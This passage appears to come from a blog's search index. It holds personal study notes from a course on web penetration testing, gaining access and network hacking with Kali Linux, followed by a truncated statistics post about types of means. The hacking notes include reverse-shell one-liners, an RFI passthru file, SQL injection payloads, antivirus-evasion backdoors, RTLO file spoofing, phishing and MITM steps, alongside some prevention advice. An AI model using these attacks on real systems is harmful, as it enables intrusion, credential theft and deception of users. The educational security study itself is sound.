'$sock=fsockopen(\"[HOST_IP]\",8080);exec(\"/bin/sh -i <&3 >&3 2>&3\");' Ruby 1 ruby - rsocket - e 'f=TCPSocket.open(\"[HOST_IP]\",8080).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' Netcat 1 nc -e /bin/sh [ HOST_IP ] 8080 Local File Inclusion Allows an attacker to read ANY file on the same server. Allows access of outside www folder. /etc/passwd contains all the users for the current os. Go back into the directories to find the above file. So if the url contains something like page=include.php , do something like page=/../../../../../etc/passwd . What this does is by instead of loading the specific file that was originally targeted, we can load something that it wasn't intending to load from the same server. Remote File Inclusion If doing this on an actual server the file you want to access has to have a real IP or domain name. create a php file with the following: 1 2 3 4 5 <?php passthru ( \"[command]\" ); ?> passthru executes system commands. For example use the netcat command as above. Ensure this file is stored on a webserver that the target can access. Make sure the file extension is .txt not .php or it runs on your webserver. Listen for connections. nc -vv -l -p [port] Under the page= part paste the location of your php file. and add a ? to the end to exe as php eg. page=[ip]/[file]? Prevention of Web Server Exploits The above only happens because the server allows it and is misconfigured. File upload vulnerabilities Do not allow unsafe files to be uploaded. If you are asking for an image ensure it is an image, never allow exe uploads. Check the file type, not the extension. Code exec vulnerabilities Do'nt use dangerous functions, Filter the input before execution If you have to use function make sure you analyse the input before exec. Use regular expressions (regex). File inclusion vulnerabilties Disable the allow_url_fopen and allow_url_include settings in php (in the /etc/php5/cgi/php.ini) Use static file inclusion (hard code the files) SQL Injection and Attacks Obligatory XKCD comic on SQL injection attacks: To connect to a mySQL database mysql -u [username] -h [IP of server] show databases; use [database]; show tables; Discovering SQL Injections with Form Submissions (POST) Whenever you see an input box try to break it, try using AND, ORDER BY or '. Look for subtle changes. Enter correct info then ' then use AND, use a # as a comment to terminate early. An example of this is a user/password input box(s) may potentially be making a SQL query like SELECT * from accounts where user='$USER_INPUT_BOX_VALUE' and password='$PASSWORD_INPUT_BOX_VALUE' . We could run an injection on this query by setting our password as 123456' AND 1=1# . This would hopefully execute and confirm that we could inject any SQL query into the webserver database (such as show all passwords). Bypassing Logins via Injections Another neat use would be to inject the SQL query such that the query ends up as SELECT * from accounts where user='admin' and password='wrong_password' or 1=1 , this would potentially log us in as admin without knowing the password at all as the second case in the and statement will be True if the query evaluates 1 to be equal to 1. Discovering SQL Injections in Data Retrieval (GET) Always try to inject things in the php scripts (in the address bar it will look like index.php&username=xxxx&password=xxxxx) Use ORDER BY after a field eg. index.php&username=xxxx' ORDER BY 1 #&password=xxxxx Ensure to use the URL encoding for symbols ie. # = %23 Order By column 100000 will return an error keep doing order by 1,2,3,4,5 and when you get an error you know the db has that amount of columns Use a union eg. index.php&username=xxxx' union 1,2,3,4,5 #&password=xxxxx Swap the numbers with other stuff ie. 1,database(),user(),version(),5 union select 1, table_name, null, null,5 from information_schema.tables Read and Writing Files on the Server via SQL. We can also use SQL injections to read/write files that located on the target computer as well. Reading union select null, load_file('/etc/passwd'), null, null,null Writing union select null, 'example example', null, null,null into outfile '[path]' Use SQLmap to do the Above and More sqlmap --help sqlmap -u \"[target_url]\" sqlmap -u \"[target_url]\" --dbs to get the databases sqlmap -u \"[target_url]\" --current-user to get user sqlmap -u \"[target_url]\" --current-db current database sqlmap -u \"[target_url]\" --tables -D [database] gets the tables in the -D database sqlmap -u \"[target_url]\" --columns -T [table_name] -D [database] gets columns in the tables of the database sqlmap -u \"[target_url]\" -T [table_name] -D [database] --dump Get all the data in the table of the database Prevention of SQL Vulnerabilities Use filters (but can be bypassed) Use a deny list or allow list. (but can be bypassed) Best method is to code the web application in a way that does not allow code injection. To do the above you must use parameterised statements. (where the data and the code are separated) Prepare you statement most languages have a function for it. So the statement is static and only the value will be inserted eg. prepare(select * from username where username = ?) then when the statement is executed if it will search for the raw input data Use filters as second line. Use a user with the least amount of privileges needed. CROSS SITE SCRIPTING(XSS) Executed on the people browsing the website not the server. Allows javascript injection onto the page. Code is executed when the page loads. 3 main types Persistent/Stored XSS Reflected XSS - non persistent xss. only will work if the target visits a specially crafted url eg. target.com/page.php?something=<script>alert('xss')</script> DOM based XSS Test text boxes and urls with parameters (the php stuff). Inject beef hook into vulnerable pages. If text areas have a max length, go into developer console and inspect element and change the max length. Prevention of XSS Vulnerabilities Minimize input. Convert user input to the html character symbol so &nsb and instead of & use &jsjs; . Escape the input. Rarely trust alerts within the browser! To Automatically Discover Web Vulnerabilities Use Zed Attack Proxy (zap) https://owasp.org/www-project-zap/ , this is already installed on Kali. Search in apps ZAP You have to get this app via github. chmod +x [name] Run it After install click no persistent. The cog icon on the left allows options to be modified If you click the green plus on the bottom window then go to active scans. then the little panel in the top left the the windows you can change policies. Add the url in automated scan. Bottom left under alerts, is where all the vulnerabilities that have been discovered are displayed. If you right click one of the alerts (bottom left) then open in browsers it will show you the exploit and how it got it.","tags":"Software","url":"https://jackmckew.dev/web-penetration-testing-with-kali-linux.html","loc":"https://jackmckew.dev/web-penetration-testing-with-kali-linux.html"},{"title":"Gaining Access with Kali Linux","text":"This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? \"Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing\". Kali Linux is free to download and you can find it at: https://www.kali.org/downloads/ . This post is apart of a series of posts, see the other posts at: Network Hacking with Kali Linux Web Penetration Testing with Kali Linux Thank you to Chris B for helping me with the notes in this post below! Table of Contents Gaining Access Server Side Attacks Metasploit Exploiting Backdoors An Example Backdoor Attack Payloads Nexpose Client Side Attacks Creating Backdoors Connecting from the Backdoor Deploying Backdoors via Fake Updates Deploying Backdoors via Exe Downloads Protection Social Engineering Maltego Backdooring Any File Type Spoofing File Type Spoofing Fake Emails BeEF (Browser Exploitation Framework) Using the Above - Outside the Local Network Post Exploitation Maintaining Access Pivoting Gaining Access Any electronic device is a computer all concepts will work wether it is a phone, tv, router, websites, webservers etc Two types of attacks: Server side - Doesn't require user interaction all we need is an IP Client side - Requires user interaction such as opening a file or clicking a link Server Side Attacks Make sure the machine is pingable (open terminal and run ping [IP] ). Learning as much as possible about the target is essential for conducting a successful attack, if you can learn things such as: Operating systems Installed programs Ports being used etc We can then use this information for identifying potential exploits (search engines are perfect for this). Things to look out for are: Run Zenmap (Nmap) on the IP. Click the ports and services tab up the top to learn about the ports being used / misconfigured. Google the version of operating system / programs for potential exploits If you find an open FTP (file transfer protocol) port, try to connect through it Try default usernames and passwords to log in (sometimes they won't have a password) Metasploit Metasploit is a penetration testing framework that makes hacking simple. It's an essential tool for many attackers and defenders. Point Metasploit at your target, pick an exploit, what payload to drop, and hit Enter. Before testing metasploit on a live system, it's preferential to test on a virtualised system, enter metasploitable. Metasploitable is an intentionally vulnerable target machine for evaluating Metasploit which is virtualised and can be downloaded from: https://information.rapid7.com/download-metasploitable-2017.html . Exploiting Backdoors First from the information you've gathered about the target, we can then search for what exploits are available, and to use metasploit is as easy as: msfconsole (runs the metasploit console) help (help on any command) show [something] (something can be exploits, payloads, auxilaries or options) use [something] (uses an exploit, payload, auxilarie) set [option] [value] (configure [option] to have [value] ) exploit - runs the current task An Example Backdoor Attack Typically this will only work if the backdoor is already installed on the target computer. find out the exploit to use via google open msfconsole type use [exploit_name/path] show options set the options (usually the RHOSTS) `set RHOSTS [ip] run exploit If this is successful, you will now have access to a remote terminal in the target and essentially do anything you want on the target machine. Payloads A payload is a piece of code that is to be executed through an existing exploit. For example twp types of payloads are to: to open a port on the target and connect to it (aka bind ) open a port on the attacking computer, connect to the attacking computer from the target bypassing the firewall (aka reverse ) On a reverse , setting the open port on the attacking computer to 80, will mimic that of a typical webserver and thus also bypassing any firewall filtration. Setting a payload in metasploit can be done with the option set payload [payload] . Nexpose Nexpose is another product from the creators of metasploitable, and it is a vulnerability scanner. Nexpose will find any available exploits in your network that could be used, this could be used from a red team (attacker) and blue team (defender) perspective! Nexpose can be downloaded from: https://www.rapid7.com/products/nexpose/ . There is a free community edition! Client Side Attacks Client side attacks are typically the next step if server side attacks fail or are not viable in the situation. Although, client side attacks can potentially be more difficult to accomplish as we are now (likely) depending on the weakest link in the security to be the human rather than a computer. In client side attacks, social engineering is one of the most used attack vectors, which also means that gaining as much information as possible about the target is critical for a successful attack. Creating Backdoors For creating backdoors we use a program called veil . Veil can installed via apt-get , and the source code is all open over at: https://github.com/Veil-Framework/Veil . To use Veil: (use evasion, and use a rev_https (aka reverse https connection)): Run veil list to list available tools use [toolname] to use tools, evasion is a typical tool to use list (under a tool) to see available payloads use [payload number] check the options to set be sure to set the LHOST (the IP for the target to connect to) set LHOST [ip] if you have a webserver running change to port, a good port is 8080 (an alternate port used by webservers) set LPORT 8080 options to see options. For bypassing more antivirus programs, the more options you change, the less likely an existing identified signature is out there, we can change these options with 1. set PROCESSORS [number(1)] change processors. 2. set SLEEP [number(6)] Finally use generate to make backdoor. To check if it is detectable you can use the check vt command (this will only check signatures) go to https://nodistribute.com/ and scan there Connecting from the Backdoor We need to listen for the connection. Need the attack payload and the port (eg, go/meterpeter/rev_https, 8080) Open the metasploit framework. msfconsole To listen use the handler module use exploit/multi/handler set the payload set PAYLOAD windows/meterpeter/reverse_https set the correct settings (the LPORT and LHOST you used in the backdoor). exploit Now we wait for the target user to run the backdoor (the .exe file). Deploying Backdoors via Fake Updates By mimicking an update server for a software package, we can hide out backdoor as a new update for a software. To do this we use Evilgrade (which is also fully open source): https://github.com/infobyte/evilgrade . Once evilgrade is installed, you can check hijackable programs using show modules , configure options for said modules using configure [module_name] and start evilgrade with start . This then makes use of MITM attacks such as ARP or DNS spoofing, read more about these in my previous post at [INSERT KALI NETWORK HACKING POST]. When using evilgrade, ensuring that the exploit is listening before mimicking the update server with the malicious software. Deploying Backdoors via Exe Downloads Another way to deploy backdoors, is to intercept an .exe that is being downloaded on the target and replace it with the malicious .exe . It's necessary to be the MITM to undertake this attack. One way to do this (although unsupported as of 08/2017) is via BDFProxy: https://github.com/secretsquirrel/BDFProxy . Once up and running, whenever a user attempts to download an .exe , it'll be intercepted and injected with the malicious backdoor. Note that the target .exe will be downloaded and run as normal, not raising any suspicions from the user. Protection Ensure that there is no MITM in your network Only download from HTTPS pages Use checksums to ensure the download is as the provider desired it to be (eg, MD5) Social Engineering The definition of social engineering (in information security context) is: \"the use of deception to manipulate individuals into divulging confidential or personal information that may be used for fraudulent purposes.\". The aim of the game is to gather as much information as possible about our target such that we can better pose an attack. Maltego Maltego is a piece of software that we can easily & quickly gather information about a target, it can be downloaded from: https://www.maltego.com/ . It can be used to determine where a specific target has accounts, websites, phone numbers, etc and who they may connect with. It shows all this in a graph representation in the client. Backdooring Any File Type This is typically done by compiling a malicious script and then disguising it as the source file. Note that this may not work for more technically advanced targets, as when you change the icon for a .exe file, there will still be a prompt to run this file when opened. For example, if you are trying to disguise a PDF, normally users aren't asked to run a PDF when opened, so this may raise suspicions with the target, and potentially foiling the attack. Spoofing File Type In the above example, we highlighted concerns that our file will prompt to be run and have the extension .exe . We can circumvent this problem by spoofing our executable to look as if it was the original file type (eg, .pdf ). One way to do this is by using the right to left unicode character in the filename ( U+202E ). So what we will do is if our target file that we want to disguise as is name the-book-of-reflex.pdf . We will name our malicious executable as the-book-of-reflfdp.exe , and insert a right to left unicode character before fdp.exe , which will reverse the end of our file, thus ending up with the-book-of-reflexe.pdf . Browsers will typically remove the right to left unicode character in file names, so make sure to zip the malicious file to bypass this. Spoofing Fake Emails There's lots of free options out there on the web for sending fake emails, but they will likely end up in the spam box of the target's email. Another option is to find a SMTP (Simple Mail Transfer Protocol) server that offers a free program, typically these are used for marketing by companies so less likely to end up in the spam. Kali also provides a utility called sendemail which we can use once we have a SMTP server to use. Find out more about this utility (with the source code) over at: https://github.com/mogaal/sendemail . Once we're able to send a fake email, we can now embed our spoofed malicious executable on a file sharing website (eg, Google drive) and include it in the email (see Backdooring Any File Type ). It's advisable to use an existing email that you know your target is familiar with from the information that you've gathered. BeEF (Browser Exploitation Framework) From the BeEF website itself: \"BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.\". You can also find the source code over at https://github.com/beefproject/beef . What BeEF let's us do is insert some JavaScript code onto a website to 'hook' the website, allowing us to do lots of different things (eg, fake login pages, etc). Since the hook is just embedded in sites with JavaScript, this will enable attacks on any modern browser and device (eg, phones, tablets, laptops, etc). Once hooked you get all sorts of information on the target system including browser version, operating system, versions of capabilities (plugins) installed etc. It is easiest to deploy BeEF and run the commands when you are the MITM in the network. This will also allow us to hook all websites the user visits rather than just the one. One example command we can use is to mimic a browser plug-in update to get the target to download and run a malicious backdoor. Using the Above - Outside the Local Network If you are using any of these attacks external to your local network, there's a few steps to configure to ensure: Router must handle reverse connections Use public IP vs Private IP of the router Forward the targeted port of the router to the attacking machine in the local network Post Exploitation The main part of launching a hack is not only to get access to a target PC, but get/find what's on the target and make sure that we can always get into the target. Another prime example on conducting a hack on a target PC, may not be to get to that exact machine, more so to get into the network that machine is connected to and find other resources (this is also known as pivoting). Maintaining Access Once you have backdoored into a system, the backdoor connection is likely running on a process (similar to what you see in task manager on Windows), it's typically good practice to migrate the backdoor connection onto a process that is unlikely to be closed (eg, explorer.exe ). If you are using metasploit for this, it's as easy as running migrate [processID] . There's also other methodologies for maintaining access such as: Using veil-evasion (see Creating Backdoors ) Use metasploit persistence to maintain the connection Use metasploit and veil-evasion together: Background your current meterpeter session background use a module in msfconsole use exsploit/windows/local/persistance show options to configure set EXE_NAME browser (or something inconspicuous) set the session you wish to place set SESSION [no.] use the EXE::Custom the inject veil backdoor (not service). set EXE::Custom [path] exploit Pivoting Use the device you hacked, hack into other devices on the intranet. We can set up an autoroute to use metasploit on the infected target as if it was the source attacking device. Upload any tools you need. (in metasploit) eg. Nmap use autoroute (in metasploit) use post/windows/manage/autoroute set subnet [subnet] - Set the subnet to the first 3 dots then 0 ie. xx.xx.xx.0 set session [id] - Sets the session to run it on. exploit","tags":"Software","url":"https://jackmckew.dev/gaining-access-with-kali-linux.html","loc":"https://jackmckew.dev/gaining-access-with-kali-linux.html"},{"title":"Network Hacking with Kali Linux","text":"This post will go into ways we can use Kali Linux to hack networks and PCs! What is Kali Linux? \"Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing\". Kali Linux is free to download and you can find it at: https://www.kali.org/downloads/ . These are notes from the Udemy course: https://www.udemy.com/course/learn-ethical-hacking-from-scratch/ , highly recommend this course, very practical and beginner friendly. This post is apart of a series of posts, see the other posts at: Gaining Access with Kali Linux Web Penetration Testing with Kali Linux Thank you to Chris B for helping me with the notes in this post below! Table of Contents Network Hacking Networking Fundamentals Checking Network Configuration Checking Wireless Networks Sniffing Data from Specific Device DeAuthentication Attack Gaining Access Cracking WEP Fake Authentication Attack Cracking WPA/WPA2 With WPS Without WPS Securing your Network Post Connection Attacks (MITM Attacks) Discovering Devices on the Network NetDiscover Nmap ARP Attack BetterCap HTTPS DNS Spoofing JavaScript Code Injection WireShark Creating a Honeypot (fake access point) Detection & Security Detecting ARP Attacks Preventing MITM Attacks Network Hacking Networking Fundamentals Checking Network Configuration Commands to use in terminal to check network state: ifconfig for all connection states iwconfig for all wireless connection states The MAC address (specified by manufacturer) will be listed in ifconfig under ether . You can alter the MAC address in memory directly by: Disabling that adapter ifconfig eth0 down Reassign a new MAC address ifconfig eth0 hw ether 00:11:22:33:44:55 The MAC address will be reset upon restarting or reconnecting the device. Checking Wireless Networks We can seek out wireless networks using airodump-ng . Ensure that your wireless access point (typically USB device) is in monitor mode with iwconfig wlan0 mode monitor . Now we can listen to available networks with airodump-ng mon0 (where mon0 is the access point in monitor mode). To listen on a variety of bands (eg, 2.4GHz and 5GHz), use the command airodump-ng --band abg mon0 . Sniffing Data from Specific Device To sniff data to a file, the command airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card] . This will sniff the data being transmitted by this device, and write it to a series of files. This data can later be analysed by programs like WireShark (because the data captured is potentially encrypted). DeAuthentication Attack This is a denial of service attack, but specifically for use in a Wi-Fi context. Ensuring to run airodump-ng at the same time during this attack. This is achieved with aireplay-ng and all that is required is to know the target MAC address (which is available in generic network sniffing (see above)). aireplay-ng -D --deauth [#deauthPackets] -a [NetworkMAC] -c [TargetMAC] [wifi card] Gaining Access Cracking WEP Capture a large amount of packets airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card] run aircrack-ng [filename.cap] (leave step 1 running in the background) To connect with ascii found, copy paste and connect! TO CONNECT WITH KEY FOUND!, copy the key after the text provided in the square brackets, remove the colons [:], and copy paste that number when the Wi-Fi asks for a password. If the network is not busy and not enough packets are being sent force the network to make packets (see step 3 in Fake Authentication Attack ) Fake Authentication Attack run airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card] run aireplay-ng --fakeauth [number of times (0 for 1 time)] -D -a [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ] (Note in monitor mode MAC is the first 12 digits after unspec + replace [-] with [:] ) make sure your associated with the network (step 2) and run aireplay-ng --arpreplay -b [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ] then run the crack aircrack-ng [filename.cap] may want to leave all 3 running at once Cracking WPA/WPA2 For cracking WPA or WPA2, look out for WPS, this will enable the hack to much simpler as WPS is an 8 digit pin. Otherwise same attack as WEP , but will take longer as WPA/WPA2 were designed to solve WEP's problems, thus more secure. WPS is only available if the router supports WPS (and not PBS(push button authentication)) With WPS to find all networks with WPS enabled use wash --interface [WirelessAdapter] to attack a network with WPS: run fake auth on the router aireplay-ng --fakeauth [number of times (0 for 1 time)] -D -a [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ] + leave airodump-ng in background (see WEP step 1) use reaver reaver --bssid [targetMAC] --channel [channel] --interface [WirelessAdapter] -vvv --no-associate > if reaver doesn't work use this version of reaver https://ufile.io/lro4nkdv make sure you run chmod +x reaver then ./reaver [your command here] Without WPS monitor and write to a file deauthenticate a client to capture handshake create a word list: Download a word list off the internet or: Crunch can be used to create a word list using crunch [min] [max] [characters] -t [pattern] -o [filename] Need handshake + word list to crack WPA to begin cracking the password use aircrack-ng [.cap file] -w [wordlist] methods to speedup use online services with handshake & word list use GPU for cracking use rainbow tables pipe word list as it is being created Securing your Network Ensure WPA2 is used with a long, complex password with letters, special characters and numbers Change the password to the router login (typically admin, admin) Disable WPS Specify exact MAC addresses to connect (visitors won't like this) Post Connection Attacks (MITM Attacks) Discovering Devices on the Network Need to gather information (MAC, IP etc.), there are programs that do for you = NetDiscover, Nmap. NetDiscover to use NetDiscover netdiscover -r [ip_range (can only access IPs on the same subnet eg. 10.0.2.xx ends at 254 so eg. 10.0.2.1/24 /24 means all IPs] use your ip address with the last .xx being .1 if using wireless card use -i [wirelessCard] before -r or just connect to the network. if not finding anything try (interface only if using Wi-Fi, MUST BE IN MANAGED/AUTO MODE) netdiscover -i <interface> <gateway IP/8> netdiscover -i <interface> <gateway IP/16> netdiscover -i <interface> <gateway IP/24> To make sure of the gateway IP address, please route -n Nmap Zenmap is the graphical user interface of Nmap use in the target use your network with xx at the end eg. 10.0.2.1/24 (see above NetDiscover ) in the profiles there are a number of default commands to use. (ping scan might not list everything) use info found to work out things eg. does this model router have any exploits or the phone brand is samsung meaning it's running on android Quick Scan(profile) - also shows open ports and the services running on these ports eg. if port 80 is open a webserver is running. Quick scan plus - Quick scan but also shows Operating system, device type and the programs and program versions running on the ports. Fun Note: when you jailbrake an iOS device it auto installs an ssh server with default password being: alpine, and uname: root, use ssh root@[phone/server_ip] then enter yes and alpine ARP Attack Address Resolution Protocol (ARP) allows us to link ip addresses to MAC addresses. ARP request sends a signal to all clients on the network asking who has this XXX IP the IP will respond with it's MAC address goal is to trick the router into thinking you are the victim and the victim into thinking you are the router. (Man in the Middle) Use program ARPspoof arpspoof -i [interface(wificard)] -t [clientip] [gatewayip] and then arpspoof -i [interface(wificard)] -t [gatewayip] [clientip] There is also a tool called bettercap (more features). ARPspoof is not default installed use apt-get update && apt-get install -y dsniff Packets will be blocked by default on linux to allow packets to flow though on linux use echo 1 > /proc/sys/net/ipv4/ip_forward (echo 0 to revert) BetterCap use bettercap -iface [interface] (interface must be connected to the network you wish to attack) use help to get info of modules running or help [module for more] net.probe on gets all clients net.show shows all clients To do Man in the middle in Bettercap use help arp.spoof you need to modify some of the options, to do this use set [option_name] [value] (set full.duplux on and set targets in .targets) once settings have been set up turn it on arp.spoof on To capture data that is being spoofed and analyse it use the net.sniff module net.sniff on , you will see entered usernames and passwords under POST Instead of doing the above you can use a caplet, to capture data for you open a text file and type each command net.probe on set arp.spoof.fullduplex true set arp.spoof.targets [target_ips] (will need to change IP in script each time you use, to target multiple IPs use the comma [,] after each IP) arp.spoof on net.sniff on Save the file with .cap From Bash use bettercap -iface [interface] -caplet [filename] HTTPS HTTP is sent as plain text HTTPS adds a extra layer of security called TLS (Transport layer security) or SSL(Secure Socket Layer), they encrypt traffic being sent. Almost impossible to break, therefore easiest method is to downgrade the connection to HTTP can use a tool called SSL Strip . BetterCap has a caplet for this however it does not replace all HTTPS links in the loaded pages. This won't work if the target site has implemented HSTS, this can also be bypassed but is more difficult (by tricking the browser into loading a different site). One method is to use hstshijack , which a resource for this is at https://github.com/bettercap/caplets/tree/master/hstshijack . DNS Spoofing Instead of returning Google's IP return a malicious server. Kali comes installed with a webserver, to start it use service apache2 start go to KALI's IP to use. The default webpage is stored in /var/www/html. To spoof: Start bettercap with the caplet coded above Use the dns.spoof module: if you do not want to redirect to yourself change the dns.spoof.address value set dns.spoof.all so bettercap responds to any dns request set dns.spoof.all true set dns.spoof.domains to the sites you wish to be redirected to you. set dns.spoof.domains [domain1, domain2] (use * as a wildcard to do any subdoamin under a website eg.*.kali.org) start dns.spoof dns.spoof on JavaScript Code Injection How to insert JavaScript code: Have JavaScript code file go to the hstshijack plugin /usr/share/bettercap/caplets go to the .cap file and add the js code under the payloads, * means all domains then : eg. *:/code.js (otherwise use a domain). WireShark Wireshark is the world's foremost and widely-used network protocol analyzer. Only analyses data flowing though your computer, so works with man in the middle. Go into settings and select the interface you want to start capturing (hold ctl if you want to cap multiple) in output you can send it to a cap file for later analysis. HTTPS will be encrypted so be sure to use hstshijack. Green = TCP packets, Darkblue = DNS, lightblue = UTP, BLACK = TCP with errors. Filtering packets: in the filters type: http Double Click to get more info. Under the Hypertext Transfer Protocol section important info is shown. can see what type next too the info right click a packet and go follow > http stream to see exactly what was sent. again under the double click > Hypertext Transfer Protocol you can see what was requested or responded. To find usernames and passwords check under POST requests and under the html form url encoded. ctl + f to find data, set search to packet details and set last one to string and oyu can type a name like admin etc. If you want to put BetterCap data in a file use set net.sniff.output [file] Creating a Honeypot (fake access point) We use hostapd-mana to achieve this, mana is a featureful rogue access point first presented at Defcon 22 by Dominic White https://github.com/sensepost/hostapd-mana . Use Mana: start-noupstream.sh -Starts access point with no internet access start-nat-simple.sh -Starts an access point with internet access (use this) start-nat-full.sh -Starts a access point and automatically starts sniffing data, bypass https To install Mana on Linux: apt-get update apt-get --yes install build-essential pkg-config git libnl-genl-3-dev libssl-dev cd /tmp git clone https://github.com/sensepost/hostapd-mana cd hostapd-mana make -C hostapd mv /tmp/hostapd-mana/hostapd/ /usr/lib/mana-toolkit cd /usr/share/ git clone --depth 1 https://github.com/sensepost/mana.git mv mana mana-toolkit mkdir /etc/mana-toolkit/ mv mana-toolkit/run-mana/conf/*.conf /etc/mana-toolkit/ Editing Mana: edit mana settings in /etc/mana-toolkit/hostatp-mana.conf > check interface + SSID (Name). edit start script in /usr/share/mana-toolkit/run-mana/start-nat-simple.sh > check upstream interface (set to the one that has internet access), check phy (the card that is going to broadcast the network[wlan0]). start the script bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh Detection & Security Detecting ARP Attacks On Windows use arp -a if the gateway matches another MAC in the network = bad, not practical to type every time and constantly so use XARP ( http://www.xarp.net/ )! To discover suspicious activity on a network use wireshark. > go to preferances > protocols > ARP > enable detect arp request storms. Broadcast packets are dangerous that is the hacker detecting the network. If you go to Expert Information, you can see the storm info. Also under expert information you can see warning for arp poisoning and other things. You can use static arp tables (you must manually configure) system will refuse if arp changes. Problem if you need to connect to different networks. This is only detection, not prevention. There is not much we can do after detecting except exiting that network or changing access control. Preventing MITM Attacks Make sure everything is encrypted using https (Plugin to do this automatically https://www.eff.org/https-everywhere ) or use a VPN, preferably use both!.","tags":"Software","url":"https://jackmckew.dev/network-hacking-with-kali-linux.html","loc":"https://jackmckew.dev/network-hacking-with-kali-linux.html"},{"title":"Types of Averages (Means)","text":"The most common analytical task is to take a bunch of numbers in dataset and summarise it with fewer numbers, preferably a single number. Enter the 'average', sum all the numbers and divide by the count of the numbers. In mathematical terms this is known as the 'arithmetic mean', and doesn't always summarise a dataset correctly. This post looks into the other types of ways that we can summarise a dataset. The proper term for this method of summarising is determining the central tendency of the dataset. Generate The Data First step is to generate a dataset to summarise, to do this we use the random package from the standard library. Using matplotlib we can plot our 'number line'. In [2]: import random import typing random . seed ( 42 ) dataset : typing . List = [] for _ in range ( 50 ): dataset . append ( random . randint ( 1 , 100 )) print ( dataset ) import matplotlib.pyplot as plt def plot_1d_data ( arr : typing . List , val : float , ** kwargs ): constant_list = [ val for _ in range ( len ( arr ))] plt . plot ( arr , constant_list , 'x' , ** kwargs ) plot_1d_data ( dataset , 5 ) [82, 15, 4, 95, 36, 32, 29, 18, 95, 14, 87, 95, 70, 12, 76, 55, 5, 4, 12, 28, 30, 65, 78, 4, 72, 26, 92, 84, 90, 70, 54, 29, 58, 76, 36, 1, 98, 21, 90, 55, 44, 36, 20, 28, 98, 44, 14, 12, 49, 13] *{stroke-linecap:butt;stroke-linejoin:round;} Median The median is the middle number of the sorted list, in the quite literal sense. For example the median of 1,2,3,4,5 is 3; as is the same for 3,2,4,1,5. The median can be more descriptive of the dataset over the arithmetic mean whenever there are significant outliers in the data that skew the arithmetic mean. If there is an even amount of numbers in the data, the median becomes the arithmetic mean of the two middle numbers. For example, the median for 1,2,3,4,5,6 is 3.5 (3+4/2). When to use Use the median whenever there is a large spread of numbers across the domain In [3]: import statistics print ( f \"Median: { statistics . median ( dataset ) } \" ) plot_1d_data ( dataset , 5 ) plt . plot ( statistics . median ( dataset ), 5 , 'x' , color = 'red' , markersize = 50 ) plt . annotate ( 'Median' ,( statistics . median ( dataset ), 5 ),( statistics . median ( dataset ), 5.1 ), arrowprops = { 'width' : 0.1 }) Median: 40.0 Out[3]: Text(40.0, 5.1, 'Median') *{stroke-linecap:butt;stroke-linejoin:round;} Mode The mode of a dataset is the number the appears most in the dataset. It is to be noted that this is the least used method of demonstrating central tendency. When to use Mode is best used with nominal data, meaning if the data you are trying to summarise has no quantitative metrics behind it, then mode would be useful. Eg, if you are looking through textual data, finding the most used word is a significant way of summarising the data. In [4]: import statistics print ( f \"Mode: { statistics . mode ( dataset ) } \" ) plot_1d_data ( dataset , 5 ) plt . plot ( statistics . mode ( dataset ), 5 , 'x' , color = 'red' , markersize = 50 ) plt . annotate ( 'Mode' ,( statistics . mode ( dataset ), 5 ),( statistics . mode ( dataset ), 5.1 ), arrowprops = { 'width' : 0.1 }) Mode: 4 Out[4]: Text(4, 5.1, 'Mode') *{stroke-linecap:butt;stroke-linejoin:round;} Arithmetic Mean This is the most used way of representing central tendency. It is done by summing all the points in the dataset, and then dividing by the number of points (to scale back into the original domain). This is the best way of representing central tendency if the data does not containing outliers that will skew the outcome (which can be overcome by normalisation). When to use If the dataset is normally distributed, this is the ideal measure. In [5]: def arithmetic_mean ( dataset : typing . List ): return sum ( dataset ) / len ( dataset ) print ( f \"Arithmetic Mean: { arithmetic_mean ( dataset ) } \" ) plot_1d_data ( dataset , 5 ) plt . plot ( arithmetic_mean ( dataset ), 5 , 'x' , color = 'red' , markersize = 50 ) plt . annotate ( 'Arithmetic Mean' ,( arithmetic_mean ( dataset ), 5 ),( arithmetic_mean ( dataset ), 5.1 ), arrowprops = { 'width' : 0.1 }) Arithmetic Mean: 47.02 Out[5]: Text(47.02, 5.1, 'Arithmetic Mean') *{stroke-linecap:butt;stroke-linejoin:round;} Geometric Mean The geometric mean is calculated by multiplying all numbers in a set, and then calculating the nth root of the multiplied figure, when n is the count of numbers. Since this using the multiplicative nature of the dataset to find a figure to summarise by, rather than an additive figure of the arithmetic mean, thus making it more suitable for datasets with a multiplicative relationship. We calculate the nth root by raising to the power of the reciprocal. When to use If the dataset has a multiplicative nature (eg, growth in population, interest rates, etc), then geometric mean will be a more suitable way of summarising the dataset. The geometric mean is also useful when trying to summarise data with differenting scales or units as the geometric mean is technically unitless. In [6]: def multiply_list ( dataset : typing . List ) : # Multiply elements one by one result = 1 for x in dataset : result = result * x return result def geometric_mean ( dataset : typing . List ): if 0 in dataset : dataset = [ x + 1 for x in dataset ] return multiply_list ( dataset ) ** ( 1 / len ( dataset )) print ( f \"Geometric Mean: { geometric_mean ( dataset ) } \" ) plot_1d_data ( dataset , 5 ) plt . plot ( geometric_mean ( dataset ), 5 , 'x' , color = 'red' , markersize = 50 ) plt . annotate ( 'Geometric Mean' ,( geometric_mean ( dataset ), 5 ),( geometric_mean ( dataset ), 5.1 ), arrowprops = { 'width' : 0.1 }) Geometric Mean: 32.54181835292063 Out[6]: Text(32.54181835292063, 5.1, 'Geometric Mean') *{stroke-linecap:butt;stroke-linejoin:round;} Harmonic Mean Harmonic mean is calculated by: taking the reciprocal of all the numbers in the set calculating the arithmetic mean of this reciprocal set taking the reciprocal of the calculated mean When to use The harmonic mean is very useful when trying to summarise datasets that are in rates or ratios. For example if you were trying to determine the average rate of travel over a trip with many legs. In [7]: def reciprocal_list ( dataset : typing . List ): reciprocal_list = [] for x in dataset : reciprocal_list . append ( 1 / x ) return reciprocal_list def 